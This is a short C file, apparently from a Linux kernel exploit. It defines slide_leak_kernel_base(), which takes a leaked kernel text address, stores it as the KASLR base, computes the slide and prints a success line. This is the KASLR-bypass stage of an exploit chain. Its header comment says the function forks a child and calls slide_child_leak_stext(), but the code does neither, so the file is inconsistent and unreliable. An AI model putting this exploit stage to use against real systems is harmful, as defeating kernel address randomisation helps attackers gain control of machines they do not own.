#include "common.h"
// ---------------------------------------------------------------------------
// slide_leak_kernel_base — preserved from original slide.c.
// Forks a child, calls slide_child_leak_stext(), and derives kaslr_base
// from the leaked _stext pointer.
// ---------------------------------------------------------------------------
int slide_leak_kernel_base(void) {

  uint64_t stext = getkerneltextstart();
  kaslr_base = stext;
  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  pr_success("slide-kaslr-ok pid=%d base=%016llx slide=%016llx\n",
              getpid(), (unsigned long long)kaslr_base,
              (unsigned long long)kaslr_slide);
  return 1;
}
